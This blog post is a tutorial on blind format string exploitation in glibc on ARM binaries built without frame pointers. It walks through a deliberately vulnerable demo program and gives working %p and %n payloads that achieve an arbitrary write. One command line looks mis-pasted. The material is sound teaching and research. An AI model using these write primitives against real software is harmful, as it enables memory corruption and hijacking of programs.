---
title: 'Blind Format String Attacks without Frame Pointers'
description: 'Exploiting Format Strings Blindly on GLibc without Frame Pointers'
layout: ../../layouts/BlogPost.astro
---

# Blind Format String Attacks without Frame Pointers

[gera and riq's Advances in Format String Exploitation](http://phrack.org/issues/59/7.html)
and [Kilic's Blind Format String Attacks](https://www.sec.in.tum.de/i20/publications/blind-format-string-attacks)
are the two best pieces of literature I've found about blind format string attacks,
which are format string attacks but the attacker gets no output
from the application being attacked.

However, they both explain how to attack an application which is
compiled with frame pointers and don't go over how one would
exploit applications not compiled with frame pointers.

Omitting frame pointers is a very common setting for optimizing
``arm`` programs so this isn't some hypothetical problem. It's a real
issue that can make the difference between a successful and frustrated
exploit.

Similarly, a function may be called from multiple sites.
In this case, it's more ideal to keep the exploit
in the same stack frame.

Here are a couple of techniques and quirks to attack a
format string vulnerability blindly without frame pointers.

## Timing Attacks on the Server

This is your only option to exploit the server in any meaningful
way when ``%n`` is disabled for the format string functions.
It is disabled by default on ``Windows`` and disabled permanently
for ``Android``.

Therefore, what you can do is, if the application is a server
and you can hit this vulnerability multiple times in the lifetime
of this program, you can use profiling and direct paramter access
to approximate the magnitude of an address on the stack.

```c
// Example code to leak some of p on the stack.
// Because it takes time to print so many characters,
// the time the printf takes to complete scales linearly
// to the value of p.
void *p;
printf("%*$17.0s%*$17.0s%*$17.0s%*$17.0s" /* etc... */);
```

Using this technique, you can probably get the top 16 bits
of a pointer, maybe less.

## Using Pointers to Stack Variables

Frame pointers happened to be a common occurence of pointers
to stack variables being themselves on the stack but there's
no rule saying we have to use a frame pointer.

This choice seems odd but it's not entirely uncommon for
compilers to just store pointers to stack variables
also on the stack. For instance, the compiler will do this on ``arm``
architectures when passing more than 4 arguments to a function
because those spill on the stack.

## ``printf_positional`` Pain 

In gera and riq's Phrack article, they mention that the
primitive for their "pointer generator" trick on ``i386``
doesn't work on ``linux`` specifically.

To explain this, we have to delve into the source code of ``glibc`` (yuck ...).
For this, I'm going to look at [glibc 2.38](https://ftp.gnu.org/gnu/glibc) but most,
if not all, versions of glibc with ``printf_positional`` will do what I'm
going to be talking about.

The file ``vfprintf`` is in is ``stdio-common/vfprintf-internal.c``.
This contains the code every formatting function uses in ``glibc``.

The function you want to look at is ``printf_positional`` at 
``vfprintf-internal.c:1046``. This code is run lazily so it won't
run it until it finds a positional parameter that makes this necessary.
``glibc`` devs do this because it's the slow path and it's extremely
rare that positional parameters are ever used.

One of the things that ``printf_positional`` does that causes us problems
is that it will parse the entire format string in advance and then
copy all the arguments from the vararg list to an internal buffer.

This is why Phrack's pointer generator trick does not work on ``glibc``.
It assumes that the argument used is always stored at the same place
which is the case for other ``libc`` code, but not ``glibc``.

Alright, so I guess it's game over on ``glibc``, right?

## Using Direct Paramter Access Just in Time!

It turns out that we still have a trick up our sleeve.
Sequential parameter access does no copying of the arguments,
so we can manually advance the current argument by padding
with ``%.0s``, use ``%n`` to change the argument pointed
to by this argument, and then use direct parameter access
to use the argument we just changed.

Now the change to the argument will reflect in the
internal buffer ``printf_positional`` keeps and we
can use that to get an arbitrary write.

## An Example Exploit

Consider this simple vulnerable program
```c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

#define BULLSEYE 0xdead
#define BUFSZ 256

// ShootTheTarget.c
unsigned short target = 0;
int main(int argc, char **argv, char **envp)
{
        if (argc < 2) {
                fprintf(stderr, "Usage: %s <payload>\n", *argv);
                fprintf(stderr, "Shoot the target and try to get a bullseye!\n");
                return 1;
        }

        // Your format string comes from the heap, not the stack.
        char *buffer = malloc(BUFSZ);

        // This makes the example easier.
        // Even if it wasn't there, it's not unlikely
        // that you have another pointer to use
        // higher up on the call stack in this example.
        int di = 0;
        int *dp = &di;

        if (buffer == NULL) {
                fprintf(stderr, "Was unable to allocate memory for argument!\n");
                return 2;
        }

        // Seriously, your format string comes from the heap.
        strncpy(buffer, argv[1], BUFSZ);
        for (int i = 0; argv[i]; i++)
                memset(argv[i], 0, strlen(argv[i]));
        for (int i = 0; envp[i]; i++)
                memset(envp[i], 0, strlen(envp[i]));

        // Now introduce the format string bug.
        printf(buffer);
        printf("\n");
        free(buffer);

        if (target == BULLSEYE)
                fprintf(stderr, "Congratulations! You hit the bullseye!\n");
        else
                fprintf(stderr,
                        "Not quite...\n"
                        "Target = %04x\n"
                        "Dummy = %i,%p,%p\n",
                        target,
                        di, dp, &dp);
        return 0;
}
```

```sh
$ arm-none-linux-gnueabihf-gcc ShootTheTarget.c -no-pie -O2 -fstack-protector-all -Wl,-z,now -o ShootTheTarget

$ checksec --file=ShootTheTarget
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified        Fortifiable     FILE
Full RELRO      Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   126 Symbols       No    04               ShootTheTarget
```

Note that I did not have an ``arm`` system for testing.
In that case, you can add the ``-static`` flag and
execute using ``qemu-arm`` like so.

```sh
$ arm-none-linux-gnueabihf-gcc ShootTheTarget.c -no-pie -O2 -fstack-protector-all -Wl,-z,now -static -o ShootTheTarget

$ qemu-arm ./ShootTheTarget
Usage: ./ShootTheTarget <payload>
Shoot the target and try to get a bullseye!
```

From there, you can dump the stack to find pointers. 
```sh
$ ./ShootTheTarget '%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p,%p.%p.%p.%p.%p.%p.%p.%p.%p'

(nil).0xffffffff.0x40800fe3.0x109ed.(nil).0x104a5.(nil).0x40800914.0xc621b600.0x10134.0x40800948.0x10134.0x10134.0x725d8.0x106a7.(nil).0x2.0x40800a74.0x10299.0xc7dd4894.0x875c47d7,0x1097d.0x10134.0x10134.0x725d8.(nil).(nil).0x704e4.(nil).(nil)
Not quite...
Target = 0000
Dummy = 0,0x40800914,0x40800918

```

Use the pointer that corresponds to the dummy var.

```sh
$ ./ShootTheTarget '%p.%p.%p.%p.%p.%p.%p.%n.%7$p'
(nil).0xffffffff.0x40800fe3.0x109ed.(nil).0x104a5.(nil)..0x38
Not quite...
Target = 0000
Dummy = 56,0x40800954,0x40800958
```

Because the executable is not a PIE, we can get the address of ``ShootTheTarget`` like this.

```sh
# Not efficient but I could care less right now
$ arm-none-linux-gnueabihf-readelf -a ShootTheTarget | grep target

  2971: 00071e04     2 OBJECT  GLOBAL DEFAULT   20 target
```

Now we can overwrite the target like this.

```sh
$ ./ShootTheTarget qemu-arm ./ShootTheTarget '%466436.0s%.0s%.0s%.0s%.0s%.0s%.0s%n%7$n' >/dev/null >/dev/null

Not quite...
Target = 1e04
Dummy = 466436,0x40800944,0x40800948
```

A quick calculation allows us to hit the bullseye
```sh
$ ./ShootTheTarget '%466436.0s%.0s%.0s%.0s%.0s%.0s%.0s%n%49321.0s%7$n' >/dev/null
Congratulations! You hit the bullseye!
```

If we instead use only direct parameter access, we segfault because of a null pointer dereference since dummy was 0 when it was copied to the internal buffer in ``printf_positional``.

```sh
$ ./ShootTheTarget '%466436.0s%8$n%49321.0s%7$n' >/dev/null
Segmentation fault (core dumped)
```

## Conclusion

We have shown that it is possible to exploit a format string vulnerability blindly without frame pointers.

We've also shown that, even though ``glibc`` complicates
and weakens the write primitive by copying the arguments
in ``printf_positional``, it is nonetheless still possible.

I hope you've found this technique cool. Happy hacking!
